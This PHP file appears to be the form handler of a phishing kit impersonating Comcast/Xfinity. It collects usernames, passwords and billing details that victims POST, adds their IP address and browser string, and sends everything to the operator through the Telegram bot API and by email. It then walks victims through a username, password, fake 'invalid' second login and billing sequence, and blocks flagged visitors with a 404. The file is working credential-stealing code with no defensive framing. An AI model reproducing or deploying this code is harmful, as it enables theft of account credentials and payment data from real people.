<?php
include '../../settings.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if($_SESSION['blacklisted'] != 'nope') {
    header('HTTP/1.0 404 Forbidden');
    die();
}

$bank_name = 'Comcast | Xfinity';

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $uid = $_SESSION['uid'];

    $ip = get_ip();
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    $arr2 = array(
        'uid' => $uid,
        'IP' => $ip,
        'UA' => $user_agent
    );

    $datas = $_POST;
    $datas = $datas + $arr2;
    $form_name = $_POST['form_name'];

    $message = "🔥 $bank_name | $form_name 🔥%0A%0A";

    foreach($datas as $key=>$value) {
        if($key == "form_name") {
            continue;
        }

        $key = str_replace("_"," ",$key);

        if($key == "uid") {
            $message.= "💎 " . ucfirst($key) . "   :   #". $value . "%0A%0A";
            continue;
        }

        if($key == "IP") {
            $message.= "💎 <b>" . ucfirst($key) . "</b>   :   <a href='https://check-host.net/ip-info?host=". $value . "'>". $value . "</a>%0A%0A";
            continue;
        }

        $message.= "💎 " . ucfirst($key) . "   :   <code>". $value . "</code>%0A%0A";
    }

    if($telegram_results) {
        $tele_msg = str_replace("%0A","\r\n",$message);
        $tele_msg = urlencode($tele_msg);
        send($tele_msg);
    }

    if($email_results) {
        $subject .= "$bank_name | $form_name - $uid ";
        $headers .= "From: Forest40 <forest40@forest40.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email_address,$subject,$msg,$headers);
    }

    switch($form_name){
        case "First Username":
            header("Location: ../password.php?username=".$_POST['username']);
        break;

        case "First Login":
            if($double_login){
                $next = " ../invalid.php?username=".$_POST['username'];
            } else {
                $next = " ../billing.php";
            }
            header("Location:".$next);
        break;

        case "Double Login":
            header("Location: ../billing.php");
        break;

        case "Billing information":
            header("Location: ../success.php");
        break;
    }

}

function send($msg) {
    global $telegram_chat_id, $telegram_bot_api;
    $data = [
        'chat_id' => $telegram_chat_id,
        'text' => $msg,
        'parse_mode' => "html"
    ];

    $response = file_get_contents_curl("https://api.telegram.org/bot$telegram_bot_api/sendMessage?chat_id=".$telegram_chat_id."&text=".$msg."&parse_mode=html&disable_web_page_preview=true");
}

function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function get_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
